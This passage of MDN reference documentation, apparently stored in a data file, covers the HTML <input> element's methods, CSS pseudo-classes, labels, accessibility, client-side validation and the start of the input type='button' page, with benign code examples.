controls](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_writing_modes/Vertical_controls) for a modern approach to creating vertical form controls.\n\n[`results`](#results) Non-standard  \nThe `results` attribute—supported only by Safari—is a numeric value that lets you override the maximum number of entries to be displayed in the `<input>` element's natively-provided drop-down menu of previous search queries.\n\nThe value must be a non-negative decimal number. If not provided, or an invalid value is given, the browser's default maximum number of entries is used.\n\n[`webkitdirectory`](#webkitdirectory) Non-standard  \nThe Boolean `webkitdirectory` attribute, if present, indicates that only directories should be available to be selected by the user in the file picker interface. See [`HTMLInputElement.webkitdirectory`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/webkitdirectory) for additional details and examples.\n\nThough originally implemented only for WebKit-based browsers, `webkitdirectory` is also usable in Microsoft Edge as well as Firefox 50 and later. However, even though it has relatively broad support, it is still not standard and should not be used unless you have no alternative.\n\n## Methods\n\nThe following methods are provided by the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) interface which represents `<input>` elements in the DOM. Also available are those methods specified by the parent interfaces, [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement), [`Element`](https://developer.mozilla.org/en-US/docs/Web/API/Element), [`Node`](https://developer.mozilla.org/en-US/docs/Web/API/Node), and [`EventTarget`](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget).\n\n[`checkValidity()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/checkValidity)  \nReturns `true` if the element's value passes validity checks; otherwise, returns `false` and fires an [`invalid`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/invalid_event) event at the element.\n\n[`reportValidity()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/reportValidity)  \nReturns `true` if the element's value passes validity checks; otherwise, returns `false`, fires an [`invalid`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/invalid_event) event at the element, and (if the event isn't canceled) reports the problem to the user.\n\n[`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select)  \nSelects the entire content of the `<input>` element, if the element's content is selectable. For elements with no selectable text content (such as a visual color picker or calendar date input), this method does nothing.\n\n[`setCustomValidity()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setCustomValidity)  \nSets a custom message to display if the input element's value isn't valid.\n\n[`setRangeText()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setRangeText)  \nSets the contents of the specified range of characters in the input element to a given string. A `selectMode` parameter is available to allow controlling how the existing content is affected.\n\n[`setSelectionRange()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setSelectionRange)  \nSelects the specified range of characters within a textual input element. Does nothing for inputs which aren't presented as text input fields.\n\n[`showPicker()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/showPicker)  \nDisplays the browser picker for the input element that would normally be displayed when the element is selected, but triggered from a button press or other user interaction.\n\n[`stepDown()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepDown)  \nDecrements the value of a numeric input by one, by default, or by the specified number of units.\n\n[`stepUp()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepUp)  \nIncrements the value of a numeric input by one or by the specified number of units.\n\n## CSS\n\nInputs, being replaced elements, have a few features not applicable to non form elements. There are CSS selectors that can specifically target form controls based on their UI features, also known as UI pseudo-classes. The input element can also be targeted by type with attribute selectors. There are some properties that are especially useful as well.\n\n### UI pseudo-classes\n\n| Pseudo-class                                                                                | Description                                                                                                                                                                                                                                                                 |\n|---------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`:enabled`](https://developer.mozilla.org/en-US/docs/Web/CSS/:enabled)                     | Any currently enabled element that can be activated (selected, clicked on, typed into, etc.) or accept focus and also has a disabled state, in which it can't be activated or accept focus.                                                                                 |\n| [`:disabled`](https://developer.mozilla.org/en-US/docs/Web/CSS/:disabled)                   | Any currently disabled element that has an enabled state, meaning it otherwise could be activated (selected, clicked on, typed into, etc.) or accept focus were it not disabled.                                                                                            |\n| [`:read-only`](https://developer.mozilla.org/en-US/docs/Web/CSS/:read-only)                 | Element not editable by the user                                                                                                                                                                                                                                            |\n| [`:read-write`](https://developer.mozilla.org/en-US/docs/Web/CSS/:read-write)               | Element that is editable by the user.                                                                                                                                                                                                                                       |\n| [`:placeholder-shown`](https://developer.mozilla.org/en-US/docs/Web/CSS/:placeholder-shown) | Element that is currently displaying [`placeholder` text](#placeholder), including `<input>` and [`<textarea>`](textarea) elements with the [`placeholder`](#placeholder) attribute present that has, as yet, no value.                                                     |\n| [`:default`](https://developer.mozilla.org/en-US/docs/Web/CSS/:default)                     | Form elements that are the default in a group of related elements. Matches [checkbox](input/checkbox) and [radio](input/radio) input types that were checked on page load or render.                                                                                        |\n| [`:checked`](https://developer.mozilla.org/en-US/docs/Web/CSS/:checked)                     | Matches [checkbox](input/checkbox) and [radio](input/radio) input types that are currently checked (and the ([`<option>`](option) in a [`<select>`](select) that is currently selected).                                                                                    |\n| [`:indeterminate`](https://developer.mozilla.org/en-US/docs/Web/CSS/:indeterminate)         | [checkbox](input/checkbox) elements whose indeterminate property is set to true by JavaScript, [radio](input/radio) elements, when all radio buttons with the same name value in the form are unchecked, and [`<progress>`](progress) elements in an indeterminate state    |\n| [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid)                         | Form controls that can have constraint validation applied and are currently valid.                                                                                                                                                                                          |\n| [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid)                     | Form controls that have constraint validation applied and are currently not valid. Matches a form control whose value doesn't match the constraints set on it by its attributes, such as [`required`](#required), [`pattern`](#pattern), [`step`](#step) and [`max`](#max). |\n| [`:in-range`](https://developer.mozilla.org/en-US/docs/Web/CSS/:in-range)                   | A non-empty input whose current value is within the range limits specified by the [`min`](#min) and [`max`](#max) attributes and the [`step`](#step).                                                                                                                       |\n| [`:out-of-range`](https://developer.mozilla.org/en-US/docs/Web/CSS/:out-of-range)           | A non-empty input whose current value is NOT within the range limits specified by the [`min`](#min) and [`max`](#max) attributes or does not adhere to the [`step`](#step) constraint.                                                                                      |\n| [`:required`](https://developer.mozilla.org/en-US/docs/Web/CSS/:required)                   | `<input>`, [`<select>`](select), or [`<textarea>`](textarea) element that has the [`required`](#required) attribute set on it. Only matches elements that can be required. The attribute included on a non-requirable element will not make for a match.                    |\n| [`:optional`](https://developer.mozilla.org/en-US/docs/Web/CSS/:optional)                   | `<input>`, [`<select>`](select), or [`<textarea>`](textarea) element that does NOT have the [`required`](#required) attribute set on it. Does not match elements that can't be required.                                                                                    |\n| [`:blank`](https://developer.mozilla.org/en-US/docs/Web/CSS/:blank)                         | `<input>` and [`<textarea>`](textarea) elements that currently have no value.                                                                                                                                                                                               |\n| [`:user-invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:user-invalid)           | Similar to `:invalid`, but is activated on blur. Matches invalid input but only after the user interaction, such as by focusing on the control, leaving the control, or attempting to submit the form containing the invalid control.                                       |\n\nCaptions super relevant to the `<input>` element:\n\n#### Pseudo-classes example\n\nWe can style a checkbox label based on whether the checkbox is checked or not. In this example, we are styling the [`color`](https://developer.mozilla.org/en-US/docs/Web/CSS/color) and [`font-weight`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-weight) of the [`<label>`](label) that comes immediately after a checked input. We haven't applied any styles if the `input` is not checked.\n\ncss\n\n```\ninput:checked + label {\n  color: red;\n  font-weight: bold;\n}\n```\n\n### Attribute selectors\n\nIt is possible to target different types of form controls based on their [`type`](#type) using [attribute selectors](https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Selectors/Attribute_selectors). CSS attribute selectors match elements based on either just the presence of an attribute or the value of a given attribute.\n\ncss\n\n```\n/* matches a password input */\ninput[type=\"password\"] {\n}\n\n/* matches a form control whose valid values are limited to a range of values*/\ninput[min][max] {\n}\n\n/* matches a form control with a pattern attribute */\ninput[pattern] {\n}\n```\n\n### ::placeholder\n\nBy default, the appearance of placeholder text is a translucent or light gray. The [`::placeholder`](https://developer.mozilla.org/en-US/docs/Web/CSS/::placeholder) pseudo-element is the input's [`placeholder` text](#placeholder). It can be styled with a limited subset of CSS properties.\n\ncss\n\n```\n::placeholder {\n  color: blue;\n}\n```\n\nOnly the subset of CSS properties that apply to the [`::first-line`](https://developer.mozilla.org/en-US/docs/Web/CSS/::first-line) pseudo-element can be used in a rule using `::placeholder` in its selector.\n\n### appearance\n\nThe [`appearance`](https://developer.mozilla.org/en-US/docs/Web/CSS/appearance) property enables the displaying of (almost) any element as a platform-native style based on the operating system's theme as well as the removal of any platform-native styling with the `none` value.\n\nYou could make a `<div>` look like a radio button with `div {appearance: radio;}` or a radio look like a checkbox with `[type=\"radio\"] {appearance: checkbox;}`, but don't.\n\nSetting `appearance: none` removes platform native borders, but not functionality.\n\n### caret-color\n\nA property specific to text entry-related elements is the CSS [`caret-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/caret-color) property, which lets you set the color used to draw the text input caret:\n\n#### HTML\n\nhtml\n\n```\n<label for=\"textInput\">Note the red caret:</label>\n<input id=\"textInput\" class=\"custom\" size=\"32\" />\n```\n\n#### CSS\n\ncss\n\n```\ninput.custom {\n  caret-color: red;\n  font:\n    16px \"Helvetica\",\n    \"Arial\",\n    \"sans-serif\";\n}\n```\n\n#### Result\n\n### field-sizing\n\nThe [`field-sizing`](https://developer.mozilla.org/en-US/docs/Web/CSS/field-sizing) property enables you to control the sizing behavior of form inputs (i.e. they are given a default preferred size by default.) This property enables you to override the default behavior, allowing form controls to adjust in size to fit their contents.\n\nThis property is typically used to create form fields that shrinkwrap their content and grow as more text is entered. This works with input types that accept direct text input (for example, [`text`](input/text) and [`url`](input/url)), input type [`file`](input/file), and [`<textarea>`](textarea) elements.\n\n### object-position and object-fit\n\nIn certain cases (typically involving non-textual inputs and specialized interfaces), the `<input>` element is a [replaced element](https://developer.mozilla.org/en-US/docs/Web/CSS/Replaced_element). When it is, the position and size of the element's size and positioning within its frame can be adjusted using the CSS [`object-position`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-position) and [`object-fit`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit) properties.\n\n### Styling\n\nFor more information about adding color to elements in HTML, see:\n\n- [Applying color to HTML elements using CSS](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_colors/Applying_color).\n\nAlso see:\n\n- [Styling HTML forms](https://developer.mozilla.org/en-US/docs/Learn/Forms/Styling_web_forms)\n- [Advanced styling for HTML forms](https://developer.mozilla.org/en-US/docs/Learn/Forms/Advanced_form_styling) and\n- the [compatibility table of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls).\n\n## Additional features\n\n### Labels\n\nLabels are needed to associate assistive text with an `<input>`. The [`<label>`](label) element provides explanatory information about a form field that is *always* appropriate (aside from any layout concerns you have). It's never a bad idea to use a `<label>` to explain what should be entered into an `<input>` or [`<textarea>`](textarea).\n\n#### Associated labels\n\nThe semantic pairing of `<input>` and `<label>` elements is useful for assistive technologies such as screen readers. By pairing them using the `<label>`'s [`for`](label#for) attribute, you bond the label to the input in a way that lets screen readers describe inputs to users more precisely.\n\nIt does not suffice to have plain text adjacent to the `<input>` element. Rather, usability and accessibility requires the inclusion of either implicit or explicit [`<label>`](label):\n\nhtml\n\n```\n<!-- inaccessible -->\n<p>Enter your name: <input id=\"name\" type=\"text\" size=\"30\" /></p>\n\n<!-- implicit label -->\n<p>\n  <label>Enter your name: <input id=\"name\" type=\"text\" size=\"30\" /></label>\n</p>\n\n<!-- explicit label -->\n<p>\n  <label for=\"name\">Enter your name: </label>\n  <input id=\"name\" type=\"text\" size=\"30\" />\n</p>\n```\n\nThe first example is inaccessible: no relationship exists between the prompt and the `<input>` element.\n\nIn addition to an accessible name, the label provides a larger 'hit' area for mouse and touch screen users to click on or touch. By pairing a `<label>` with an `<input>`, clicking on either one will focus the `<input>`. If you use plain text to \"label\" your input, this won't happen. Having the prompt part of the activation area for the input is helpful for people with motor control conditions.\n\nAs web developers, it's important that we never assume that people will know all the things that we know. The diversity of people using the web—and by extension your website—practically guarantees that some of your site's visitors will have some variation in thought processes and/or circumstances that leads them to interpret your forms very differently from you without clear and properly-presented labels.\n\n#### Placeholders are not accessible\n\nThe [`placeholder`](#placeholder) attribute lets you specify text that appears within the `<input>` element's content area itself when it is empty. The placeholder should never be required to understand your forms. It is not a label, and should not be used as a substitute, because it isn't. The placeholder is used to provide a hint as to what an inputted value should look like, not an explanation or prompt.\n\nNot only is the placeholder not accessible to screen readers, but once the user enters any text into the form control, or if the form control already has a value, the placeholder disappears. Browsers with automatic page translation features may skip over attributes when translating, meaning the `placeholder` may not get translated.\n\n**Note:** Don't use the [`placeholder`](#placeholder) attribute if you can avoid it. If you need to label an `<input>` element, use the [`<label>`](label) element.\n\n### Client-side validation\n\n**Warning:** Client-side validation is useful, but it does *not* guarantee that the server will receive valid data. If the data must be in a specific format, *always* verify it also on the server-side, and return a [`400` HTTP response](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/400) if the format is invalid.\n\nIn addition to using CSS to style inputs based on the [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) or [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) UI states based on the current state of each input, as noted in the [UI pseudo-classes](#ui_pseudo-classes) section above, the browser provides for client-side validation on (attempted) form submission. On form submission, if there is a form control that fails constraint validation, supporting browsers will display an error message on the first invalid form control; displaying a default message based on the error type, or a message set by you.\n\nSome input types and other attributes place limits on what values are valid for a given input. For example, `<input type=\"number\" min=\"2\" max=\"10\" step=\"2\">` means only the number 2, 4, 6, 8, or 10 are valid. Several errors could occur, including a `rangeUnderflow` error if the value is less than 2, `rangeOverflow` if greater than 10, `stepMismatch` if the value is a number between 2 and 10, but not an even integer (does not match the requirements of the `step` attribute), or `typeMismatch` if the value is not a number.\n\nFor the input types whose domain of possible values is periodic (that is, at the highest possible value, the values wrap back around to the beginning rather than ending), it's possible for the values of the [`max`](#max) and [`min`](#min) properties to be reversed, which indicates that the range of permitted values starts at `min`, wraps around to the lowest possible value, then continues on until `max` is reached. This is particularly useful for dates and times, such as when you want to allow the range to be from 8 PM to 8 AM:\n\nhtml\n\n```\n<input type=\"time\" min=\"20:00\" max=\"08:00\" name=\"overnight\" />\n```\n\nSpecific attributes and their values can lead to a specific error [`ValidityState`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState):\n\n| Attribute                 | Relevant property                                                                                                 | Description                                                                                                                                                                            |\n|---------------------------|-------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`max`](#max)             | [`validityState.rangeOverflow`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/rangeOverflow)     | Occurs when the value is greater than the maximum value as defined by the `max` attribute                                                                                              |\n| [`maxlength`](#maxlength) | [`validityState.tooLong`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/tooLong)                 | Occurs when the number of characters is greater than the number allowed by the `maxlength` property                                                                                    |\n| [`min`](#min)             | [`validityState.rangeUnderflow`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/rangeUnderflow)   | Occurs when the value is less than the minimum value as defined by the `min` attribute                                                                                                 |\n| [`minlength`](#minlength) | [`validityState.tooShort`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/tooShort)               | Occurs when the number of characters is less than the number required by the `minlength` property                                                                                      |\n| [`pattern`](#pattern)     | [`validityState.patternMismatch`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/patternMismatch) | Occurs when a pattern attribute is included with a valid regular expression and the `value` does not match it.                                                                         |\n| [`required`](#required)   | [`validityState.valueMissing`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/valueMissing)       | Occurs when the `required` attribute is present but the value is `null` or radio or checkbox is not checked.                                                                           |\n| [`step`](#step)           | [`validityState.stepMismatch`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/stepMismatch)       | The value doesn't match the step increment. Increment default is `1`, so only integers are valid on `type=\"number\"` is step is not included. `step=\"any\"` will never throw this error. |\n| [`type`](#type)           | [`validityState.typeMismatch`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/typeMismatch)       | Occurs when the value is not of the correct type, for example an email does not contain an `@` or a url doesn't contain a protocol.                                                    |\n\nValidity object errors depend on the `<input>` attributes and their values:\n\nIf a form control doesn't have the `required` attribute, no value, or an empty string, is not invalid. Even if the above attributes are present, with the exception of `required`, an empty string will not lead to an error.\n\nWe can set limits on what values we accept, and supporting browsers will natively validate these form values and alert the user if there is a mistake when the form is submitted.\n\nIn addition to the errors described in the table above, the `validityState` interface contains the `badInput`, `valid`, and `customError` boolean readonly properties. The validity object includes:\n\n- [`validityState.valueMissing`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/valueMissing)\n- [`validityState.typeMismatch`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/typeMismatch)\n- [`validityState.patternMismatch`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/patternMismatch)\n- [`validityState.tooLong`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/tooLong)\n- [`validityState.tooShort`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/tooShort)\n- [`validityState.rangeUnderflow`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/rangeUnderflow)\n- [`validityState.rangeOverflow`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/rangeOverflow)\n- [`validityState.stepMismatch`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/stepMismatch)\n- [`validityState.badInput`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/badInput)\n- [`validityState.valid`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState)\n- [`validityState.customError`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState)\n\nFor each of these Boolean properties, a value of `true` indicates that the specified reason validation may have failed is true, with the exception of the `valid` property, which is `true` if the element's value obeys all constraints.\n\nIf there is an error, supporting browsers will both alert the user and prevent the form from being submitted. A word of caution: if a custom error is set to a truthy value (anything other than the empty string or `null`), the form will be prevented from being submitted. If there is no custom error message, and none of the other properties return true, `valid` will be true, and the form can be submitted.\n\njs\n\n```\nfunction validate(input) {\n  let validityState_object = input.validity;\n  if (validityState_object.valueMissing) {\n    input.setCustomValidity(\"A value is required\");\n  } else if (validityState_object.rangeUnderflow) {\n    input.setCustomValidity(\"Your value is too low\");\n  } else if (validityState_object.rangeOverflow) {\n    input.setCustomValidity(\"Your value is too high\");\n  } else {\n    input.setCustomValidity(\"\");\n  }\n}\n```\n\nThe last line, setting the custom validity message to the empty string is vital. If the user makes an error, and the validity is set, it will fail to submit, even if all the values are valid, until the message is `null`.\n\n#### Custom validation error example\n\nIf you want to present a custom error message when a field fails to validate, you need to use the [Constraint Validation API](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation#validating_forms_using_javascript) available on `<input>` (and related) elements. Take the following form:\n\nhtml\n\n```\n<form>\n  <label for=\"name\">Enter username (upper and lowercase letters): </label>\n  <input type=\"text\" name=\"name\" id=\"name\" required pattern=\"[A-Za-z]+\" />\n  <button>Submit</button>\n</form>\n```\n\nThe basic HTML form validation features will cause this to produce a default error message if you try to submit the form with either no valid filled in, or a value that does not match the `pattern`.\n\nIf you wanted to instead display custom error messages, you could use JavaScript like the following:\n\njs\n\n```\nconst nameInput = document.querySelector(\"input\");\n\nnameInput.addEventListener(\"input\", () => {\n  nameInput.setCustomValidity(\"\");\n  nameInput.checkValidity();\n});\n\nnameInput.addEventListener(\"invalid\", () => {\n  if (nameInput.value === \"\") {\n    nameInput.setCustomValidity(\"Enter your username!\");\n  } else {\n    nameInput.setCustomValidity(\n      \"Usernames can only contain upper and lowercase letters. Try again!\",\n    );\n  }\n});\n```\n\nThe example renders like so:\n\nIn brief:\n\n- We check the valid state of the input element every time its value is changed by running the `checkValidity()` method via the `input` event handler.\n- If the value is invalid, an `invalid` event is raised, and the `invalid` event handler function is run. Inside this function we work out whether the value is invalid because it is empty, or because it doesn't match the pattern, using an `if ()` block, and set a custom validity error message.\n- As a result, if the input value is invalid when the submit button is pressed, one of the custom error messages will be shown.\n- If it is valid, it will submit as you'd expect. For this to happen, the custom validity has to be cancelled, by invoking `setCustomValidity()` with an empty string value. We therefore do this every time the `input` event is raised. If you don't do this, and a custom validity was previously set, the input will register as invalid, even if it currently contains a valid value on submission.\n\n**Note:** Always validate input constraints both client side and server side. Constraint validation doesn't remove the need for validation on the *server side*. Invalid values can still be sent by older browsers or by bad actors.\n\n**Note:** Firefox supported a proprietary error attribute — `x-moz-errormessage` — for many versions, which allowed you set custom error messages in a similar way. This has been removed as of version 66 (see [Firefox bug 1513890](https://bugzil.la/1513890)).\n\n### Localization\n\nThe allowed inputs for certain `<input>` types depend on the locale. In some locales, 1,000.00 is a valid number, while in other locales the valid way to enter this number is 1.000,00.\n\nFirefox uses the following heuristics to determine the locale to validate the user's input (at least for `type=\"number\"`):\n\n- Try the language specified by a `lang`/`xml:lang` attribute on the element or any of its parents.\n- Try the language specified by any `Content-Language` HTTP header. Or,\n- If none specified, use the browser's locale.\n\n## Technical summary\n\n[TABLE]\n\n## Accessibility concerns\n\n### Labels\n\nWhen including inputs, it is an accessibility requirement to add labels alongside. This is needed so those who use assistive technologies can tell what the input is for. Also, clicking or touching a label gives focus to the label's associated form control. This improves the accessibility and usability for sighted users, increases the area a user can click or touch to activate the form control. This is especially useful (and even needed) for radio buttons and checkboxes, which are tiny. For more information about labels in general see [Labels](#labels) .\n\nThe following is an example of how to associate the `<label>` with an `<input>` element in the above style. You need to give the `<input>` an `id` attribute. The `<label>` then needs a `for` attribute whose value is the same as the input's `id`.\n\nhtml\n\n```\n<label for=\"peas\">Do you like peas?</label>\n<input type=\"checkbox\" name=\"peas\" id=\"peas\" />\n```\n\n### Size\n\nInteractive elements such as form input should provide an area large enough that it is easy to activate them. This helps a variety of people, including people with motor control issues and people using non-precise forms of input such as a stylus or fingers. A minimum interactive size of 44×44 [CSS pixels](https://www.w3.org/TR/WCAG21/#dfn-css-pixels) is recommended.\n\n- [Understanding Success Criterion 2.5.5: Target Size \\| W3C Understanding WCAG 2.1](https://www.w3.org/WAI/WCAG21/Understanding/target-size.html)\n- [Target Size and 2.5.5 \\| Adrian Roselli](https://adrianroselli.com/2019/06/target-size-and-2-5-5.html)\n- [Quick test: Large touch targets - The A11Y Project](https://www.a11yproject.com/posts/large-touch-targets/)\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [Form constraint validation](../constraint_validation)\n- [Your first HTML form](https://developer.mozilla.org/en-US/docs/Learn/Forms/Your_first_form)\n- [How to structure an HTML form](https://developer.mozilla.org/en-US/docs/Learn/Forms/How_to_structure_a_web_form)\n- [The native form widgets](https://developer.mozilla.org/en-US/docs/Learn/Forms/Basic_native_form_controls)\n- [Sending form data](https://developer.mozilla.org/en-US/docs/Learn/Forms/Sending_and_retrieving_form_data)\n- [Form data validation](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation)\n- [How to build custom form widgets](https://developer.mozilla.org/en-US/docs/Learn/Forms/How_to_build_custom_form_controls)\n- [HTML forms in legacy browsers](https://developer.mozilla.org/en-US/docs/Learn/Forms/HTML_forms_in_legacy_browsers)\n- [Styling HTML forms](https://developer.mozilla.org/en-US/docs/Learn/Forms/Styling_web_forms)\n- [Advanced styling for HTML forms](https://developer.mozilla.org/en-US/docs/Learn/Forms/Advanced_form_styling)\n- [CSS property compatibility table](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n- [Creating vertical form controls](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_writing_modes/Vertical_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input)"
- name: input type="button"
  summary: <input> elements of type button are rendered as simple push buttons, which can be programmed to control custom functionality anywhere on a webpage as required when assigned an event handler function (typically for the click event)
  description: "# \\<input type=\"button\"\\>\n\n[`<input>`](../input) elements of type `button` are rendered as simple push buttons, which can be programmed to control custom functionality anywhere on a webpage as required when assigned an event handler function (typically for the [`click`](https://developer.mozilla.org/en-US/docs/Web/API/Element/click_event) event).\n\n## Try it\n\n#### HTML Demo: \\<input type=\"button\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <input class=\"styled\" type=\"button\" value=\"Add to favorites\" />\n\n    .styled {\n      border: 0;\n      line-height: 2.5;\n      padding: 0 20px;\n      font-size: 1rem;\n      text-align: center;\n      color: #fff;\n      text-shadow: 1px 1px 1px #000;\n      border-radius: 10px;\n      background-color: rgb(220 0 0 / 100%);\n      background-image: linear-gradient(\n        to top left,\n        rgb(0 0 0 / 20%),\n        rgb(0 0 0 / 20%) 30%,\n        rgb(0 0 0 / 0%)\n      );\n      box-shadow:\n        inset 2px 2px 3px rgb(255 255 255 / 60%),\n        inset -2px -2px 3px rgb(0 0 0 / 60%);\n    }\n\n    .styled:hover {\n      background-color: rgb(255 0 0 / 100%);\n    }\n\n    .styled:active {\n      box-shadow:\n        inset -2px -2px 3px rgb(255 255 255 / 60%),\n        inset 2px 2px 3px rgb(0 0 0 / 60%);\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n**Note:** While `<input>` elements of type `button` are still perfectly valid HTML, the newer [`<button>`](../button) element is now the favored way to create buttons. Given that a [`<button>`](../button)'s label text is inserted between the opening and closing tags, you can include HTML in the label, even images.\n\n## Value\n\n### Button with a value\n\nAn `<input type=\"button\">` elements' [`value`](../input#value) attribute contains a string that is used as the button's label. The `value` provides the [accessible description](https://developer.mozilla.org/en-US/docs/Glossary/Accessible_description) for the button.\n\nhtml\n\n```\n<input type=\"button\" value=\"Click Me\" />\n```\n\n### Button without a value\n\nIf you don't specify a `value`, you get an empty button:\n\nhtml\n\n```\n<input type=\"button\" />\n```\n\n## Using buttons\n\n`<input type=\"button\">` elements have no default behavior (their cousins, `<input type=\"submit\">` and [`<input type=\"reset\">`](reset) are used to submit and reset forms, respectively). To make buttons do anything, you have to write JavaScript code to do the work.\n\n### A simple button\n\nWe'll begin by creating a simple button with a [`click`](https://developer.mozilla.org/en-US/docs/Web/API/Element/click_event) event handler that starts our machine (well, it toggles the `value` of the button and the text content of the following paragraph):\n\nhtml\n\n```\n<form>\n  <input type=\"button\" value=\"Start machine\" />\n</form>\n<p>The machine is stopped.</p>\n```\n\njs\n\n```\nconst button = document.querySelector(\"input\");\nconst paragraph = document.querySelector(\"p\");\n\nbutton.addEventListener(\"click\", updateButton);\n\nfunction updateButton() {\n  if (button.value === \"Start machine\") {\n    button.value = \"Stop machine\";\n    paragraph.textContent = \"The machine has started!\";\n  } else {\n    button.value = \"Start machine\";\n    paragraph.textContent = \"The machine is stopped.\";\n  }\n}\n```\n\nThe script gets a reference to the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) object representing the `<input>` in the DOM, saving this reference in the variable `button`. [`addEventListener()`](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener) is then used to establish a function that will be run when [`click`](https://developer.mozilla.org/en-US/docs/Web/API/Element/click_event) events occur on the button.\n\n### Adding keyboard shortcuts to buttons\n\nKeyboard shortcuts, also known as access keys and keyboard equivalents, let the user trigger a button using a key or combination of keys on the keyboard. To add a keyboard shortcut to a button — just as you would with any [`<input>`](../input) for which it makes sense — you use the [`accesskey`](../../global_attributes/accesskey) global attribute.\n\nIn this example, s is specified as the access key (you'll need to press s plus the particular modifier keys for your browser/OS combination; see [accesskey](../../global_attributes/accesskey) for a useful list of those).\n\nhtml\n\n```\n<form>\n  <input type=\"button\" value=\"Start machine\" accesskey=\"s\" />\n</form>\n<p>The machine is stopped.</p>\n```\n\n**Note:** The problem with the above example of course is that the user will not know what the access key is! In a real site, you'd have to provide this information in a way that doesn't interfere with the site design (for example by providing an easily accessible link that points to information on what the site accesskeys are).\n\n### Disabling and enabling a button\n\nTo disable a button, specify the [`disabled`](../../attributes/disabled) global attribute on it, like so:\n\nhtml\n\n```\n<input type=\"button\" value=\"Disable me\" disabled />\n```\n\n#### Setting the disabled attribute\n\nYou can enable and disable buttons at run time by setting `disabled` to `true` or `false`. In this example our button starts off enabled, but if you press it, it is disabled using `button.disabled = true`. A [`setTimeout()`](https://developer.mozilla.org/en-US/docs/Web/API/setTimeout) function is then used to reset the button back to its enabled state after two seconds.\n\nhtml\n\n```\n<input type=\"button\" value=\"Enabled\" />\n```\n\njs\n\n```\nconst button = document.querySelector(\"input\");\n\nbutton.addEventListener(\"click\", disableButton);\n\nfunction disableButton() {\n  button.disabled = true;\n  button.value = \"Disabled\";\n  setTimeout(() => {\n    button.disabled = false;\n    button.value = \"Enabled\";\n  }, 2000);\n}\n```\n\n#### Inheriting the disabled state\n\nIf the `disabled` attribute isn't specified, the button inherits its `disabled` state from its parent element. This makes it possible to enable and disable groups of elements all at once by enclosing them in a container such as a [`<fieldset>`](../fieldset) element, and then setting `disabled` on the container.\n\nThe example below shows this in action. This is very similar to the previous example, except that the `disabled` attribute is set on the `<fieldset>` when the first button is pressed — this causes all three buttons to be disabled until the two second timeout has passed.\n\nhtml\n\n```\n<fieldset>\n  <legend>Button group</legend>\n 